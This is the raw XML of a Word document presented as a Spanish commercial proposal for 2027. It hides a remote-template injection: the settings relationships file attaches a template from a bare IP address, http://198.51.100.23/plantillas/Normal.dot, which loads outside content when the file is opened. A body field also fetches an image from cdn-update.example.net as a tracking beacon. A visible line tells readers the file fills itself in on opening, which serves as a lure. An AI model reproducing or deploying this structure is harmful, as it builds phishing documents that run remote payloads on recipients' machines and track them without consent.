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Default Extension="png" ContentType="image/png"/>
  <Default Extension="jpeg" ContentType="image/jpeg"/>
  <Default Extension="emf" ContentType="image/x-e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A1B2C3">
      <w:r>
        <w:t xml:space="preserve">Propuesta comercial 2027 — Grupo Ejemplo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A1B2C3">
      <w:r>
        <w:t xml:space="preserve">Adjuntamos las condiciones revisadas para el próximo ejercicio.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A1B2C3">
      <w:r>
        <w:t xml:space="preserve">El documento se completa automáticamente al abrirlo; espere unos segundos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> INCLUDEPICTURE "http://cdn-update.example.net/px/logo.png" \d </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:t>Loading…</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/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Tpl"/>
  <w:defaultTabStop w:val="708"/>
  <w:rsids>
    <w:rsidRoot w:val="00B1C2D3"/>
    <w:rsid w:val="00B1C2D3"/>
    <w:rsid w:val="0047AA19"/>
  </w:rsids>
</w:setting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ettings" Target="settings.xml"/></Relationships>
</file>

<file path=word/_rels/settings.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdTpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://198.51.100.23/plantillas/Normal.dot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Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Company>Suministros Iberia S.L.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2027</dc:title>
  <dc:subject/>
  <dc:creator>María López</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>Administrador</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-30T10:00:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-12T08:31:00Z</dcterms:modified>
</cp:coreProperties>
</file>